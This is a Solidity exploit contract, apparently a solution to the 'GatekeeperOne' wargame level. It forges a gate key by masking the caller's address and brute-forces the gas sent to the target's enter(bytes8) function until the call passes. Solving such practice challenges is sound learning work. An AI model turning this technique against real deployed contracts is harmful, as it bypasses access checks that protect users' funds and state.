// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Attack {
    address public gatekeeperOne;

    event SuccessOn(uint256 n);

    constructor(address _gatekeeperOne) {
        gatekeeperOne = _gatekeeperOne;
    }

    function attack(uint start) public {
        bytes8 gateKey = bytes8(uint64(uint160(msg.sender))) &
            0xFFFFFFFF0000FFFF;

        for (uint i = start; i < start + 100; i++) {
            (bool success, ) = gatekeeperOne.call{gas: 8191 * 5 + i}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                emit SuccessOn(i);
                return;
            }
        }

        revert();
    }
}